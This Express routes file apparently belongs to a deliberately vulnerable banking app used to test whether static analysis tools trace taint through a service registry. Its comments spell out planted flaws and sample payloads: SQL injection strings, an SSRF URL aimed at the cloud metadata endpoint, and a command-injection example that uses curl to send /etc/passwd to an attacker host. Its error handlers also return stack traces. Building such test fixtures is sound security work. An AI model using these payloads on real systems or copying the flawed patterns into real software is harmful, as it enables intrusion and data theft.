/**
 * VaultBank Service Consumer Routes.
 * SECURITY TRAINING: VULN-DI001 (runtime type resolution hides concrete vulnerabilities)
 *
 * Routes here call getService() which returns a BaseAccountService instance at the
 * call-site type level. The concrete VaultAccountService implementation contains
 * VULN-DI002–DI006. SAST tools must resolve the service registry to find the
 * vulnerable implementations — tools that stop at the abstract interface miss them.
 *
 * DO NOT USE IN PRODUCTION.
 */

'use strict';

const express = require('express');
const router  = express.Router();
const { getService } = require('../services/base-service');
const { authenticateToken } = require('../middleware/auth');

// ─── GET /svc/accounts/:accountNumber ────────────────────────────────────────
/**
 * Retrieve a single account by its account number.
 *
 * VULN-DI002: SQL injection via unsanitised accountNumber.
 *   The concrete VaultAccountService.findByAccountNumber() interpolates the
 *   parameter directly into a raw SQL string.
 *
 * SAST challenge: At this call site, `service` is typed as BaseAccountService.
 *   The abstract interface declares findByAccountNumber(accountNumber: string):
 *   Promise<Account>. SAST tools that do not follow the registry lookup to
 *   VaultAccountService will see only the abstract signature and will not flag
 *   the injection in the concrete body.
 */
router.get('/accounts/:accountNumber', authenticateToken, async (req, res) => {
  const { accountNumber } = req.params;

  // SAST challenge: static type here is BaseAccountService — concrete type resolved at runtime
  const service = getService();

  try {
    // Resolves to VULN-DI002 in VaultAccountService.findByAccountNumber()
    const account = await service.findByAccountNumber(accountNumber);

    if (!account) {
      return res.status(404).json({ error: 'Account not found' });
    }

    return res.status(200).json({
      accountNumber: account.account_number,
      type:          account.account_type,
      balance:       account.balance,
      currency:      account.currency || 'USD',
      status:        account.status,
      ownerId:       account.user_id,
      createdAt:     account.created_at,
    });
  } catch (err) {
    return res.status(500).json({ error: err.message, stack: err.stack });
  }
});

// ─── GET /svc/accounts/search ─────────────────────────────────────────────────
/**
 * Search accounts by a query string (name, account number, etc.).
 *
 * VULN-DI003: SQL LIKE injection via unsanitised search term.
 *   The concrete VaultAccountService.search() wraps the term in a LIKE clause
 *   using string concatenation: WHERE name LIKE '%' + q + '%'. A term such as
 *   "' OR '1'='1" breaks out of the literal and dumps all accounts.
 *
 * SAST challenge: Same pattern as VULN-DI002 — the abstract BaseAccountService
 *   interface declares search(term: string): Promise<Account[]>. SAST tools that
 *   do not resolve the registry miss the unsafe concatenation in the concrete body.
 */
router.get('/accounts/search', authenticateToken, async (req, res) => {
  const { q } = req.query;

  if (!q) {
    return res.status(400).json({ error: 'Missing query parameter: q' });
  }

  // SAST challenge: static type is BaseAccountService; concrete type hidden behind registry
  const service = getService();

  try {
    // Resolves to VULN-DI003 in VaultAccountService.search()
    const results = await service.search(q);

    return res.status(200).json({
      results,
      total: results.length,
    });
  } catch (err) {
    return res.status(500).json({ error: err.message, stack: err.stack });
  }
});

// ─── POST /svc/statements/generate ───────────────────────────────────────────
/**
 * Generate an account statement file in the requested format.
 *
 * VULN-DI004: OS command injection via unsanitised `format` and `outputPath`.
 *   The concrete VaultAccountService.generateStatement() shells out to a report
 *   generator using child_process.exec(), interpolating both parameters into the
 *   command string without escaping. An attacker supplying:
 *     format:     "pdf; curl http://attacker.com/$(cat /etc/passwd)"
 *     outputPath: "/tmp/stmt.pdf"
 *   achieves arbitrary command execution.
 *
 * SAST challenge: BaseAccountService.generateStatement() is abstract. The call
 *   site passes two user-controlled strings. SAST tools that do not follow the
 *   registry to VaultAccountService.generateStatement() will not see the exec()
 *   call or flag the taint flow from req.body to the shell.
 */
router.post('/statements/generate', authenticateToken, async (req, res) => {
  const { accountId, format, outputPath } = req.body;

  if (!accountId || !format || !outputPath) {
    return res.status(400).json({ error: 'accountId, format, and outputPath are required' });
  }

  // SAST challenge: static type is BaseAccountService; exec() lives in the concrete impl
  const service = getService();

  try {
    // format and outputPath flow from req.body → resolves to VULN-DI004 in VaultAccountService
    const result = await service.generateStatement(accountId, format, outputPath);

    return res.status(200).json({
      message:    'Statement generation queued',
      accountId,
      format,
      outputPath,
      jobId:      result.jobId,
    });
  } catch (err) {
    return res.status(500).json({ error: err.message, stack: err.stack });
  }
});

// ─── POST /svc/query/custom ───────────────────────────────────────────────────
/**
 * Execute a custom query using a caller-supplied SQL template and parameters.
 *
 * VULN-DI005: SQL template injection.
 *   The concrete VaultAccountService.executeCustomQuery() accepts a `template`
 *   string and merges `params` into it using a naïve string-replace approach
 *   rather than prepared-statement placeholders. An attacker can pass:
 *     template: "SELECT * FROM accounts WHERE id = {{id}} OR 1=1--"
 *     params:   { id: 1 }
 *   to dump the entire accounts table.
 *
 * SAST challenge: The abstract interface signature is
 *   executeCustomQuery(template: string, params: object): Promise<any[]>.
 *   The unsafe merge happens exclusively in VaultAccountService. SAST tools that
 *   treat the call site as a black box (because the registry is not resolved)
 *   will not trace the taint path from req.body to the raw query execution.
 */
router.post('/query/custom', authenticateToken, async (req, res) => {
  const { template, params } = req.body;

  if (!template) {
    return res.status(400).json({ error: 'template is required' });
  }

  // SAST challenge: abstract type at call site — template injection inside concrete impl
  const service = getService();

  try {
    // template and params flow from req.body → resolves to VULN-DI005 in VaultAccountService
    const rows = await service.executeCustomQuery(template, params || {});

    return res.status(200).json({
      rows,
      count: rows.length,
    });
  } catch (err) {
    return res.status(500).json({ error: err.message, stack: err.stack });
  }
});

// ─── POST /svc/verify/provider ────────────────────────────────────────────────
/**
 * Verify an account with an external identity provider at a caller-supplied URL.
 *
 * VULN-DI006: Server-Side Request Forgery (SSRF).
 *   The concrete VaultAccountService.verifyWithProvider() makes an outbound HTTP
 *   request to `providerUrl` without validation. An attacker can supply:
 *     providerUrl: "http://169.254.169.254/latest/meta-data/"
 *   to reach the AWS instance metadata service (or any other internal endpoint),
 *   and the response is forwarded back to the caller.
 *
 * SAST challenge: The abstract BaseAccountService interface declares
 *   verifyWithProvider(accountId: string, providerUrl: string): Promise<object>.
 *   The fetch() call and the unvalidated URL parameter are inside VaultAccountService.
 *   SAST tools that do not resolve the registry see only the abstract method and
 *   cannot trace the taint from req.body.providerUrl to the outbound network call.
 */
router.post('/verify/provider', authenticateToken, async (req, res) => {
  const { accountId, providerUrl } = req.body;

  if (!accountId || !providerUrl) {
    return res.status(400).json({ error: 'accountId and providerUrl are required' });
  }

  // SAST challenge: static type is BaseAccountService — SSRF lives in the concrete fetch() call
  const service = getService();

  try {
    // providerUrl flows from req.body → resolves to VULN-DI006 in VaultAccountService
    const verificationResult = await service.verifyWithProvider(accountId, providerUrl);

    return res.status(200).json({
      accountId,
      verified:          verificationResult.verified,
      providerResponse:  verificationResult.response, // VULN-DI006: SSRF response forwarded to caller
      verifiedAt:        new Date().toISOString(),
    });
  } catch (err) {
    return res.status(500).json({ error: err.message, stack: err.stack });
  }
});

module.exports = router;
